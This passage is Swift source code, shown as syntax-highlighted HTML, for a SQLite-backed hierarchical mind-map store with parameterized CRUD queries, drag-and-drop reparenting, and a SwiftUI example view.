class="hljs-type">Void</span>, <span class="hljs-type">Error</span>&gt;) <span class="hljs-keyword">in</span><br>            dbQueue.async &#123;<br>                <span class="hljs-keyword">var</span> stmt: <span class="hljs-type">OpaquePointer</span>?<br>                <span class="hljs-keyword">if</span> sqlite3_prepare_v2(<span class="hljs-keyword">self</span>.db, sql, <span class="hljs-operator">-</span><span class="hljs-number">1</span>, <span class="hljs-operator">&amp;</span>stmt, <span class="hljs-literal">nil</span>) <span class="hljs-operator">==</span> <span class="hljs-type">SQLITE_OK</span> &#123;<br>                    sqlite3_bind_text(stmt, <span class="hljs-number">1</span>, node.id, <span class="hljs-operator">-</span><span class="hljs-number">1</span>, <span class="hljs-type">SQLITE_TRANSIENT</span>)<br>                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> pid <span class="hljs-operator">=</span> node.parentId &#123; sqlite3_bind_text(stmt, <span class="hljs-number">2</span>, pid, <span class="hljs-operator">-</span><span class="hljs-number">1</span>, <span class="hljs-type">SQLITE_TRANSIENT</span>) &#125; <span class="hljs-keyword">else</span> &#123; sqlite3_bind_null(stmt, <span class="hljs-number">2</span>) &#125;<br>                    sqlite3_bind_text(stmt, <span class="hljs-number">3</span>, node.title, <span class="hljs-operator">-</span><span class="hljs-number">1</span>, <span class="hljs-type">SQLITE_TRANSIENT</span>)<br>                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> c <span class="hljs-operator">=</span> node.content &#123; sqlite3_bind_text(stmt, <span class="hljs-number">4</span>, c, <span class="hljs-operator">-</span><span class="hljs-number">1</span>, <span class="hljs-type">SQLITE_TRANSIENT</span>) &#125; <span class="hljs-keyword">else</span> &#123; sqlite3_bind_null(stmt, <span class="hljs-number">4</span>) &#125;<br>                    sqlite3_bind_int(stmt, <span class="hljs-number">5</span>, <span class="hljs-type">Int32</span>(node.position))<br>                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> color <span class="hljs-operator">=</span> node.color &#123; sqlite3_bind_text(stmt, <span class="hljs-number">6</span>, color, <span class="hljs-operator">-</span><span class="hljs-number">1</span>, <span class="hljs-type">SQLITE_TRANSIENT</span>) &#125; <span class="hljs-keyword">else</span> &#123; sqlite3_bind_null(stmt, <span class="hljs-number">6</span>) &#125;<br><br>                    <span class="hljs-keyword">if</span> sqlite3_step(stmt) <span class="hljs-operator">==</span> <span class="hljs-type">SQLITE_DONE</span> &#123;<br>                        cont.resume()<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-keyword">let</span> msg <span class="hljs-operator">=</span> <span class="hljs-type">String</span>(cString: sqlite3_errmsg(<span class="hljs-keyword">self</span>.db))<br>                        cont.resume(throwing: <span class="hljs-type">DatabaseError</span>.insertFailed(message: msg))<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">let</span> msg <span class="hljs-operator">=</span> <span class="hljs-type">String</span>(cString: sqlite3_errmsg(<span class="hljs-keyword">self</span>.db))<br>                    cont.resume(throwing: <span class="hljs-type">DatabaseError</span>.prepareFailed(message: msg))<br>                &#125;<br>                sqlite3_finalize(stmt)<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> refreshAllNodes()<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">updateNode</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">node</span>: <span class="hljs-type">MindMapNode</span>) <span class="hljs-keyword">async</span> <span class="hljs-keyword">throws</span> &#123;<br>        <span class="hljs-keyword">let</span> sql <span class="hljs-operator">=</span> <span class="hljs-string">&quot;UPDATE mindmap_nodes SET title = ?, content = ?, position = ?, color = ?, updated_at = datetime(&#x27;now&#x27;) WHERE id = ?&quot;</span><br>        <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> withCheckedThrowingContinuation &#123; (cont: <span class="hljs-type">CheckedContinuation</span>&lt;<span class="hljs-type">Void</span>, <span class="hljs-type">Error</span>&gt;) <span class="hljs-keyword">in</span><br>            dbQueue.async &#123;<br>                <span class="hljs-keyword">var</span> stmt: <span class="hljs-type">OpaquePointer</span>?<br>                <span class="hljs-keyword">if</span> sqlite3_prepare_v2(<span class="hljs-keyword">self</span>.db, sql, <span class="hljs-operator">-</span><span class="hljs-number">1</span>, <span class="hljs-operator">&amp;</span>stmt, <span class="hljs-literal">nil</span>) <span class="hljs-operator">==</span> <span class="hljs-type">SQLITE_OK</span> &#123;<br>                    sqlite3_bind_text(stmt, <span class="hljs-number">1</span>, node.title, <span class="hljs-operator">-</span><span class="hljs-number">1</span>, <span class="hljs-type">SQLITE_TRANSIENT</span>)<br>                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> c <span class="hljs-operator">=</span> node.content &#123; sqlite3_bind_text(stmt, <span class="hljs-number">2</span>, c, <span class="hljs-operator">-</span><span class="hljs-number">1</span>, <span class="hljs-type">SQLITE_TRANSIENT</span>) &#125; <span class="hljs-keyword">else</span> &#123; sqlite3_bind_null(stmt, <span class="hljs-number">2</span>) &#125;<br>                    sqlite3_bind_int(stmt, <span class="hljs-number">3</span>, <span class="hljs-type">Int32</span>(node.position))<br>                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> color <span class="hljs-operator">=</span> node.color &#123; sqlite3_bind_text(stmt, <span class="hljs-number">4</span>, color, <span class="hljs-operator">-</span><span class="hljs-number">1</span>, <span class="hljs-type">SQLITE_TRANSIENT</span>) &#125; <span class="hljs-keyword">else</span> &#123; sqlite3_bind_null(stmt, <span class="hljs-number">4</span>) &#125;<br>                    sqlite3_bind_text(stmt, <span class="hljs-number">5</span>, node.id, <span class="hljs-operator">-</span><span class="hljs-number">1</span>, <span class="hljs-type">SQLITE_TRANSIENT</span>)<br><br>                    <span class="hljs-keyword">if</span> sqlite3_step(stmt) <span class="hljs-operator">==</span> <span class="hljs-type">SQLITE_DONE</span> &#123;<br>                        cont.resume()<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        cont.resume(throwing: <span class="hljs-type">DatabaseError</span>.queryFailed(message: <span class="hljs-type">String</span>(cString: sqlite3_errmsg(<span class="hljs-keyword">self</span>.db))))<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    cont.resume(throwing: <span class="hljs-type">DatabaseError</span>.prepareFailed(message: <span class="hljs-type">String</span>(cString: sqlite3_errmsg(<span class="hljs-keyword">self</span>.db))))<br>                &#125;<br>                sqlite3_finalize(stmt)<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> refreshAllNodes()<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">deleteNode</span>(<span class="hljs-params">id</span>: <span class="hljs-type">String</span>) <span class="hljs-keyword">async</span> <span class="hljs-keyword">throws</span> &#123;<br>        <span class="hljs-keyword">let</span> sql <span class="hljs-operator">=</span> <span class="hljs-string">&quot;DELETE FROM mindmap_nodes WHERE id = ?&quot;</span><br>        <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> withCheckedThrowingContinuation &#123; (cont: <span class="hljs-type">CheckedContinuation</span>&lt;<span class="hljs-type">Void</span>, <span class="hljs-type">Error</span>&gt;) <span class="hljs-keyword">in</span><br>            dbQueue.async &#123;<br>                <span class="hljs-keyword">var</span> stmt: <span class="hljs-type">OpaquePointer</span>?<br>                <span class="hljs-keyword">if</span> sqlite3_prepare_v2(<span class="hljs-keyword">self</span>.db, sql, <span class="hljs-operator">-</span><span class="hljs-number">1</span>, <span class="hljs-operator">&amp;</span>stmt, <span class="hljs-literal">nil</span>) <span class="hljs-operator">==</span> <span class="hljs-type">SQLITE_OK</span> &#123;<br>                    sqlite3_bind_text(stmt, <span class="hljs-number">1</span>, id, <span class="hljs-operator">-</span><span class="hljs-number">1</span>, <span class="hljs-type">SQLITE_TRANSIENT</span>)<br>                    <span class="hljs-keyword">if</span> sqlite3_step(stmt) <span class="hljs-operator">==</span> <span class="hljs-type">SQLITE_DONE</span> &#123;<br>                        cont.resume()<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        cont.resume(throwing: <span class="hljs-type">DatabaseError</span>.deleteFailed(message: <span class="hljs-type">String</span>(cString: sqlite3_errmsg(<span class="hljs-keyword">self</span>.db))))<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    cont.resume(throwing: <span class="hljs-type">DatabaseError</span>.prepareFailed(message: <span class="hljs-type">String</span>(cString: sqlite3_errmsg(<span class="hljs-keyword">self</span>.db))))<br>                &#125;<br>                sqlite3_finalize(stmt)<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> refreshAllNodes()<br>    &#125;<br><br>    <span class="hljs-comment">// MARK: - Bulk reorder positions</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">updateNodePositions</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">updates</span>: [(id: <span class="hljs-type">String</span>, position: <span class="hljs-type">Int</span>)]) <span class="hljs-keyword">async</span> <span class="hljs-keyword">throws</span> &#123;<br>        <span class="hljs-keyword">guard</span> <span class="hljs-operator">!</span>updates.isEmpty <span class="hljs-keyword">else</span> &#123; <span class="hljs-keyword">return</span> &#125;<br>        <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> withCheckedThrowingContinuation &#123; (cont: <span class="hljs-type">CheckedContinuation</span>&lt;<span class="hljs-type">Void</span>, <span class="hljs-type">Error</span>&gt;) <span class="hljs-keyword">in</span><br>            dbQueue.async &#123;<br>                <span class="hljs-keyword">var</span> stmt: <span class="hljs-type">OpaquePointer</span>?<br>                <span class="hljs-keyword">let</span> sql <span class="hljs-operator">=</span> <span class="hljs-string">&quot;UPDATE mindmap_nodes SET position = ?, updated_at = datetime(&#x27;now&#x27;) WHERE id = ?&quot;</span><br>                sqlite3_exec(<span class="hljs-keyword">self</span>.db, <span class="hljs-string">&quot;BEGIN TRANSACTION&quot;</span>, <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>)<br>                <span class="hljs-keyword">for</span> (id, pos) <span class="hljs-keyword">in</span> updates &#123;<br>                    <span class="hljs-keyword">if</span> sqlite3_prepare_v2(<span class="hljs-keyword">self</span>.db, sql, <span class="hljs-operator">-</span><span class="hljs-number">1</span>, <span class="hljs-operator">&amp;</span>stmt, <span class="hljs-literal">nil</span>) <span class="hljs-operator">==</span> <span class="hljs-type">SQLITE_OK</span> &#123;<br>                        sqlite3_bind_int(stmt, <span class="hljs-number">1</span>, <span class="hljs-type">Int32</span>(pos))<br>                        sqlite3_bind_text(stmt, <span class="hljs-number">2</span>, id, <span class="hljs-operator">-</span><span class="hljs-number">1</span>, <span class="hljs-type">SQLITE_TRANSIENT</span>)<br>                        sqlite3_step(stmt)<br>                        sqlite3_reset(stmt)<br>                    &#125;<br>                &#125;<br>                sqlite3_finalize(stmt)<br>                sqlite3_exec(<span class="hljs-keyword">self</span>.db, <span class="hljs-string">&quot;COMMIT&quot;</span>, <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>)<br>                cont.resume()<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> refreshAllNodes()<br>    &#125;<br><br>    <span class="hljs-comment">// MARK: - Hierarchical Drag &amp; Drop: update parent and position</span><br>    <span class="hljs-comment">/// Move `id` under `newParentId` at given position (position relative to siblings)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">updateNodeParent</span>(<span class="hljs-params">id</span>: <span class="hljs-type">String</span>, <span class="hljs-params">newParentId</span>: <span class="hljs-type">String</span>?, <span class="hljs-params">position</span>: <span class="hljs-type">Int</span>) <span class="hljs-keyword">async</span> <span class="hljs-keyword">throws</span> &#123;<br>        <span class="hljs-comment">// Prevent moving under its own descendant</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> newParentId <span class="hljs-operator">=</span> newParentId &#123;<br>            <span class="hljs-keyword">let</span> descendants <span class="hljs-operator">=</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> getSubtreeIds(rootId: id)<br>            <span class="hljs-keyword">if</span> descendants.contains(newParentId) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-type">DatabaseError</span>.queryFailed(message: <span class="hljs-string">&quot;Cannot move node under its own descendant&quot;</span>)<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">let</span> sql <span class="hljs-operator">=</span> <span class="hljs-string">&quot;UPDATE mindmap_nodes SET parent_id = ?, position = ?, updated_at = datetime(&#x27;now&#x27;) WHERE id = ?&quot;</span><br>        <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> withCheckedThrowingContinuation &#123; (cont: <span class="hljs-type">CheckedContinuation</span>&lt;<span class="hljs-type">Void</span>, <span class="hljs-type">Error</span>&gt;) <span class="hljs-keyword">in</span><br>            dbQueue.async &#123;<br>                <span class="hljs-keyword">var</span> stmt: <span class="hljs-type">OpaquePointer</span>?<br>                <span class="hljs-keyword">if</span> sqlite3_prepare_v2(<span class="hljs-keyword">self</span>.db, sql, <span class="hljs-operator">-</span><span class="hljs-number">1</span>, <span class="hljs-operator">&amp;</span>stmt, <span class="hljs-literal">nil</span>) <span class="hljs-operator">==</span> <span class="hljs-type">SQLITE_OK</span> &#123;<br>                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> pid <span class="hljs-operator">=</span> newParentId &#123; sqlite3_bind_text(stmt, <span class="hljs-number">1</span>, pid, <span class="hljs-operator">-</span><span class="hljs-number">1</span>, <span class="hljs-type">SQLITE_TRANSIENT</span>) &#125; <span class="hljs-keyword">else</span> &#123; sqlite3_bind_null(stmt, <span class="hljs-number">1</span>) &#125;<br>                    sqlite3_bind_int(stmt, <span class="hljs-number">2</span>, <span class="hljs-type">Int32</span>(position))<br>                    sqlite3_bind_text(stmt, <span class="hljs-number">3</span>, id, <span class="hljs-operator">-</span><span class="hljs-number">1</span>, <span class="hljs-type">SQLITE_TRANSIENT</span>)<br>                    <span class="hljs-keyword">if</span> sqlite3_step(stmt) <span class="hljs-operator">==</span> <span class="hljs-type">SQLITE_DONE</span> &#123;<br>                        cont.resume()<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        cont.resume(throwing: <span class="hljs-type">DatabaseError</span>.queryFailed(message: <span class="hljs-type">String</span>(cString: sqlite3_errmsg(<span class="hljs-keyword">self</span>.db))))<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    cont.resume(throwing: <span class="hljs-type">DatabaseError</span>.prepareFailed(message: <span class="hljs-type">String</span>(cString: sqlite3_errmsg(<span class="hljs-keyword">self</span>.db))))<br>                &#125;<br>                sqlite3_finalize(stmt)<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> refreshAllNodes()<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">getSubtreeIds</span>(<span class="hljs-params">rootId</span>: <span class="hljs-type">String</span>) <span class="hljs-keyword">async</span> <span class="hljs-keyword">throws</span> -&gt; <span class="hljs-type">Set</span>&lt;<span class="hljs-type">String</span>&gt; &#123;<br>        <span class="hljs-keyword">let</span> sql <span class="hljs-operator">=</span> <span class="hljs-string">&quot;WITH RECURSIVE ids(id) AS (SELECT id FROM mindmap_nodes WHERE id = ? UNION ALL SELECT n.id FROM mindmap_nodes n JOIN ids ON n.parent_id = ids.id) SELECT id FROM ids;&quot;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> withCheckedThrowingContinuation &#123; (cont: <span class="hljs-type">CheckedContinuation</span>&lt;<span class="hljs-type">Set</span>&lt;<span class="hljs-type">String</span>&gt;, <span class="hljs-type">Error</span>&gt;) <span class="hljs-keyword">in</span><br>            dbQueue.async &#123;<br>                <span class="hljs-keyword">var</span> stmt: <span class="hljs-type">OpaquePointer</span>?<br>                <span class="hljs-keyword">var</span> <span class="hljs-keyword">set</span> <span class="hljs-operator">=</span> <span class="hljs-type">Set</span>&lt;<span class="hljs-type">String</span>&gt;()<br>                <span class="hljs-keyword">if</span> sqlite3_prepare_v2(<span class="hljs-keyword">self</span>.db, sql, <span class="hljs-operator">-</span><span class="hljs-number">1</span>, <span class="hljs-operator">&amp;</span>stmt, <span class="hljs-literal">nil</span>) <span class="hljs-operator">==</span> <span class="hljs-type">SQLITE_OK</span> &#123;<br>                    sqlite3_bind_text(stmt, <span class="hljs-number">1</span>, rootId, <span class="hljs-operator">-</span><span class="hljs-number">1</span>, <span class="hljs-type">SQLITE_TRANSIENT</span>)<br>                    <span class="hljs-keyword">while</span> sqlite3_step(stmt) <span class="hljs-operator">==</span> <span class="hljs-type">SQLITE_ROW</span> &#123;<br>                        <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> text <span class="hljs-operator">=</span> sqlite3_column_text(stmt, <span class="hljs-number">0</span>) &#123; <span class="hljs-keyword">set</span>.insert(<span class="hljs-type">String</span>(cString: text)) &#125;<br>                    &#125;<br>                    cont.resume(returning: <span class="hljs-keyword">set</span>)<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    cont.resume(throwing: <span class="hljs-type">DatabaseError</span>.prepareFailed(message: <span class="hljs-type">String</span>(cString: sqlite3_errmsg(<span class="hljs-keyword">self</span>.db))))<br>                &#125;<br>                sqlite3_finalize(stmt)<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// MARK: - Refresh &amp; Tree Builder</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">setupTreePublisher</span>() &#123;<br>        <span class="hljs-variable">$flatNodes</span><br>            .map &#123; nodes <span class="hljs-keyword">in</span><br>                <span class="hljs-type">SQLiteMindMap</span>.buildTree(from: nodes)<br>            &#125;<br>            .receive(on: <span class="hljs-type">DispatchQueue</span>.main)<br>            .assign(to: <span class="hljs-operator">&amp;</span><span class="hljs-variable">$tree</span>)<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">buildTree</span>(<span class="hljs-params">from</span> <span class="hljs-params">nodes</span>: [<span class="hljs-type">MindMapNode</span>]) -&gt; [<span class="hljs-type">MindMapTree</span>] &#123;<br>        <span class="hljs-keyword">let</span> dict <span class="hljs-operator">=</span> <span class="hljs-type">Dictionary</span>(grouping: nodes, by: &#123; <span class="hljs-variable">$0</span>.parentId &#125;)<br>        <span class="hljs-keyword">func</span> <span class="hljs-title function_">makeSubtree</span>(<span class="hljs-params">parentId</span>: <span class="hljs-type">String</span>?) -&gt; [<span class="hljs-type">MindMapTree</span>] &#123;<br>            <span class="hljs-keyword">guard</span> <span class="hljs-keyword">let</span> children <span class="hljs-operator">=</span> dict[parentId] <span class="hljs-keyword">else</span> &#123; <span class="hljs-keyword">return</span> [] &#125;<br>            <span class="hljs-keyword">return</span> children.sorted(by: &#123; <span class="hljs-variable">$0</span>.position <span class="hljs-operator">&lt;</span> <span class="hljs-variable">$1</span>.position &#125;).map &#123; node <span class="hljs-keyword">in</span><br>                <span class="hljs-type">MindMapTree</span>(id: node.id, node: node, children: makeSubtree(parentId: node.id))<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> makeSubtree(parentId: <span class="hljs-literal">nil</span>)<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">refreshAllNodes</span>() <span class="hljs-keyword">async</span> <span class="hljs-keyword">throws</span> &#123;<br>        <span class="hljs-keyword">let</span> sql <span class="hljs-operator">=</span> <span class="hljs-string">&quot;SELECT id, parent_id, title, content, position, color, created_at, updated_at FROM mindmap_nodes ORDER BY position&quot;</span><br>        <span class="hljs-keyword">let</span> nodes <span class="hljs-operator">=</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> withCheckedThrowingContinuation &#123; (cont: <span class="hljs-type">CheckedContinuation</span>&lt;[<span class="hljs-type">MindMapNode</span>], <span class="hljs-type">Error</span>&gt;) <span class="hljs-keyword">in</span><br>            dbQueue.async &#123;<br>                <span class="hljs-keyword">var</span> stmt: <span class="hljs-type">OpaquePointer</span>?<br>                <span class="hljs-keyword">var</span> arr: [<span class="hljs-type">MindMapNode</span>] <span class="hljs-operator">=</span> []<br>                <span class="hljs-keyword">if</span> sqlite3_prepare_v2(<span class="hljs-keyword">self</span>.db, sql, <span class="hljs-operator">-</span><span class="hljs-number">1</span>, <span class="hljs-operator">&amp;</span>stmt, <span class="hljs-literal">nil</span>) <span class="hljs-operator">==</span> <span class="hljs-type">SQLITE_OK</span> &#123;<br>                    <span class="hljs-keyword">while</span> sqlite3_step(stmt) <span class="hljs-operator">==</span> <span class="hljs-type">SQLITE_ROW</span> &#123;<br>                        <span class="hljs-keyword">let</span> id <span class="hljs-operator">=</span> <span class="hljs-type">String</span>(cString: sqlite3_column_text(stmt, <span class="hljs-number">0</span>))<br>                        <span class="hljs-keyword">let</span> pid <span class="hljs-operator">=</span> sqlite3_column_text(stmt, <span class="hljs-number">1</span>).flatMap &#123; <span class="hljs-type">String</span>(cString: <span class="hljs-variable">$0</span>) &#125;<br>                        <span class="hljs-keyword">let</span> title <span class="hljs-operator">=</span> <span class="hljs-type">String</span>(cString: sqlite3_column_text(stmt, <span class="hljs-number">2</span>))<br>                        <span class="hljs-keyword">let</span> content <span class="hljs-operator">=</span> sqlite3_column_text(stmt, <span class="hljs-number">3</span>).flatMap &#123; <span class="hljs-type">String</span>(cString: <span class="hljs-variable">$0</span>) &#125;<br>                        <span class="hljs-keyword">let</span> position <span class="hljs-operator">=</span> <span class="hljs-type">Int</span>(sqlite3_column_int(stmt, <span class="hljs-number">4</span>))<br>                        <span class="hljs-keyword">let</span> color <span class="hljs-operator">=</span> sqlite3_column_text(stmt, <span class="hljs-number">5</span>).flatMap &#123; <span class="hljs-type">String</span>(cString: <span class="hljs-variable">$0</span>) &#125;<br>                        <span class="hljs-comment">// created_at/updated_at are read as strings; parsing omitted for brevity</span><br>                        <span class="hljs-keyword">let</span> node <span class="hljs-operator">=</span> <span class="hljs-type">MindMapNode</span>(id: id, parentId: pid, title: title, content: content, position: position, color: color)<br>                        arr.append(node)<br>                    &#125;<br>                    cont.resume(returning: arr)<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    cont.resume(throwing: <span class="hljs-type">DatabaseError</span>.queryFailed(message: <span class="hljs-string">&quot;refresh prepare failed&quot;</span>))<br>                &#125;<br>                sqlite3_finalize(stmt)<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">self</span>.flatNodes <span class="hljs-operator">=</span> nodes<br>    &#125;<br><br>    <span class="hljs-comment">// MARK: - Publishers</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">flatNodesPublisher</span>() -&gt; <span class="hljs-type">AnyPublisher</span>&lt;[<span class="hljs-type">MindMapNode</span>], <span class="hljs-type">Never</span>&gt; &#123;<br>        <span class="hljs-variable">$flatNodes</span>.eraseToAnyPublisher()<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">treePublisher</span>() -&gt; <span class="hljs-type">AnyPublisher</span>&lt;[<span class="hljs-type">MindMapTree</span>], <span class="hljs-type">Never</span>&gt; &#123;<br>        <span class="hljs-variable">$tree</span>.eraseToAnyPublisher()<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// MARK: - SwiftUI Helpers: DropDelegate for hierarchical drops</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">NodeDropDelegate</span>: <span class="hljs-title class_ inherited__">DropDelegate</span> &#123;<br>    <span class="hljs-keyword">let</span> targetNode: <span class="hljs-type">MindMapNode</span>?<br>    <span class="hljs-keyword">let</span> onDrop: (<span class="hljs-type">MindMapNode</span>, <span class="hljs-type">MindMapNode</span>?) -&gt; <span class="hljs-type">Void</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">performDrop</span>(<span class="hljs-params">info</span>: <span class="hljs-type">DropInfo</span>) -&gt; <span class="hljs-type">Bool</span> &#123;<br>        <span class="hljs-keyword">guard</span> <span class="hljs-keyword">let</span> provider <span class="hljs-operator">=</span> info.itemProviders(for: [<span class="hljs-type">UTType</span>.text]).first <span class="hljs-keyword">else</span> &#123; <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span> &#125;<br>        provider.loadItem(forTypeIdentifier: <span class="hljs-type">UTType</span>.text.identifier, options: <span class="hljs-literal">nil</span>) &#123; data, <span class="hljs-keyword">_</span> <span class="hljs-keyword">in</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> data <span class="hljs-operator">=</span> data <span class="hljs-keyword">as?</span> <span class="hljs-type">Data</span>, <span class="hljs-keyword">let</span> id <span class="hljs-operator">=</span> <span class="hljs-type">String</span>(data: data, encoding: .utf8) &#123;<br>                <span class="hljs-type">Task</span> &#123; <span class="hljs-meta">@MainActor</span> <span class="hljs-keyword">in</span><br>                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> dragged <span class="hljs-operator">=</span> <span class="hljs-type">SQLiteMindMap</span>.shared.flatNodes.first(where: &#123; <span class="hljs-variable">$0</span>.id <span class="hljs-operator">==</span> id &#125;) &#123;<br>                        onDrop(dragged, targetNode)<br>                    &#125;<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> str <span class="hljs-operator">=</span> data <span class="hljs-keyword">as?</span> <span class="hljs-type">String</span> &#123;<br>                <span class="hljs-type">Task</span> &#123; <span class="hljs-meta">@MainActor</span> <span class="hljs-keyword">in</span><br>                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> dragged <span class="hljs-operator">=</span> <span class="hljs-type">SQLiteMindMap</span>.shared.flatNodes.first(where: &#123; <span class="hljs-variable">$0</span>.id <span class="hljs-operator">==</span> str &#125;) &#123;<br>                        onDrop(dragged, targetNode)<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// MARK: - SwiftUI Example: Hierarchical MindMap View</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">struct HierarchicalMindMapView: View &#123;</span><br><span class="hljs-comment">    @StateObject private var db = SQLiteMindMap.shared</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    var body: some View &#123;</span><br><span class="hljs-comment">        ScrollView &#123;</span><br><span class="hljs-comment">            VStack(alignment: .leading) &#123;</span><br><span class="hljs-comment">                ForEach(db.tree) &#123; root in</span><br><span class="hljs-comment">                    TreeNodeView(tree: root)</span><br><span class="hljs-comment">                &#125;</span><br><span class="hljs-comment">            &#125;</span><br><span class="hljs-comment">            .padding()</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">        .task &#123;</span><br><span class="hljs-comment">            // example bootstrapping</span><br><span class="hljs-comment">            if db.flatNodes.isEmpty &#123;</span><br><span class="hljs-comment">                let r = MindMapNode(title: &quot;Root&quot;)</span><br><span class="hljs-comment">                try? await db.insertNode(r)</span><br><span class="hljs-comment">                let c1 = MindMapNode(parentId: r.id, title: &quot;Child A&quot;, position: 0)</span><br><span class="hljs-comment">                try? await db.insertNode(c1)</span><br><span class="hljs-comment">                let c2 = MindMapNode(parentId: r.id, title: &quot;Child B&quot;, position: 1)</span><br><span class="hljs-comment">                try? await db.insertNode(c2)</span><br><span class="hljs-comment">            &#125;</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">struct TreeNodeView: View &#123;</span><br><span class="hljs-comment">    var tree: MindMapTree</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    var body: some View &#123;</span><br><span class="hljs-comment">        DisclosureGroup(tree.node.title) &#123;</span><br><span class="hljs-comment">            ForEach(tree.children) &#123; child in</span><br><span class="hljs-comment">                TreeNodeView(tree: child)</span><br><span class="hljs-comment">                    .padding(.leading, 16)</span><br><span class="hljs-comment">                    .onDrag &#123;</span><br><span class="hljs-comment">                        NSItemProvider(object: child.node.id as NSString)</span><br><span class="hljs-comment">                    &#125;</span><br><span class="hljs-comment">                    .onDrop(of: [UTType.text], delegate: NodeDropDelegate(targetNode: child.node, onDrop: handleDrop))</span><br><span class="hljs-comment">            &#125;</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">        .onDrag &#123; NSItemProvider(object: tree.node.id as NSString) &#125;</span><br><span class="hljs-comment">        .onDrop(of: [UTType.text], delegate: NodeDropDelegate(targetNode: tree.node, onDrop: handleDrop))</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    func handleDrop(dragged: MindMapNode, target: MindMapNode?) &#123;</span><br><span class="hljs-comment">        Task &#123;</span><br><span class="hljs-comment">            // Insert dragged as child of target (or as root if target == nil) at position 0</span><br><span class="hljs-comment">            try? await SQLiteMindMap.shared.updateNodeParent(id: dragged.id, newParentId: target?.id, position: 0)</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">&#125;</span><br><span 